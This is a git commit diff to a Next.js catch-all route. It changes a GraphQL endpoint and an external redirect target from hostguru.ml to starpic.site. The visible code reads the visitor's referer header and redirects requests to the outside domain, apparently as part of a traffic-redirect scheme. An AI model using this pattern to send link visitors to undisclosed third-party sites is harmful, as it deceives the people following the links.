46d558bc55c0ea8fdbe538c9bd374f57bfb1659d
techyeyestore <129699711+techyeyestore@users.noreply.github.com>
2024-07-12 05:16:08 +0530

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = " https://hostguru.ml/graphql"
+	const endpoint = " https://starpic.site/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					` https://hostguru.ml/` + encodeURI(path as string)
+					` https://starpic.site/` + encodeURI(path as string)
 				}`,
 			},
 		};
